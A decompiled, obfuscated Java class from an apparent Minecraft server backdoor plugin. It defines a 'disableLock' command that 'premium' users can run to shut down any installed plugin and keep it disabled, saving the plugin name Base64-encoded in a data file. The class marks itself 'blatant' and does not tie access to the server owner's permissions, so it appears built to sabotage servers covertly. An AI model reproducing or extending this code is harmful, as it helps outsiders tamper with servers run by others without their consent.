/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 *  org.bukkit.plugin.Plugin
 */
package me.system.runner.command.impl.premium;

import java.util.Base64;
import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.data.DataManager;
import me.system.runner.methods.API;
import me.system.runner.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;

public class DisablelockCommand
extends Command {
    @Override
    public void execute(Core lllIIlIllIIIII, String lllIIlIllIIIll, String[] lllIIlIlIlllll, Player lllIIlIlIllllI) {
        if (lllIIlIllIIIII.premium.contains(lllIIlIlIllllI.getName())) {
            if (lllIIlIlIlllll.length <= 1) {
                lllIIlIlIllllI.sendMessage(Settings.USAGE("disableLock <plugin>"));
            } else if (Bukkit.getPluginManager().getPlugin(lllIIlIlIlllll[1]) == null) {
                lllIIlIlIllllI.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append(lllIIlIlIlllll[1]).append(" doesn't exist. (Cap Sensitive)"))));
            } else if (DataManager.getData().getStringList("epic-pl").isEmpty()) {
                lllIIlIlIllllI.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append(lllIIlIlIlllll[1]).append(" is now disabled and will stay disabled!"))));
                byte[] lllIIlIllIlIIl = Base64.getEncoder().encode(lllIIlIlIlllll[1].getBytes());
                DataManager.idk.add(new String(lllIIlIllIlIIl));
                DataManager.getData().set("epic-pl", DataManager.idk);
                DataManager.saveData();
                API.disablePlugin(lllIIlIlIlllll[1]);
            } else {
                for (String lllIIlIllIIllI : DataManager.getData().getStringList("epic-pl")) {
                    Plugin lllIIlIllIlIII;
                    if (lllIIlIllIIllI.contains((lllIIlIllIlIII = Bukkit.getPluginManager().getPlugin(lllIIlIlIlllll[1])).getName())) {
                        lllIIlIlIllllI.sendMessage(Settings.PREFIX("This plugin is already disable locked"));
                        continue;
                    }
                    lllIIlIlIllllI.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append(lllIIlIlIlllll[1]).append(" is now disabled and will stay disabled!"))));
                    byte[] lllIIlIllIIlll = Base64.getEncoder().encode(lllIIlIlIlllll[1].getBytes());
                    DataManager.idk.add(new String(lllIIlIllIIlll));
                    DataManager.getData().set("epic-pl", DataManager.idk);
                    DataManager.saveData();
                    API.disablePlugin(lllIIlIlIlllll[1]);
                }
            }
        } else {
            lllIIlIlIllllI.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("You must be a ").append(Settings.RED).append("premium user ").append(Settings.WHITE).append("to execute this command"))));
        }
    }

    public DisablelockCommand() {
        DisablelockCommand lllIIlIlllIIlI;
    }

    @Override
    public boolean isBlatant() {
        return true;
    }
}

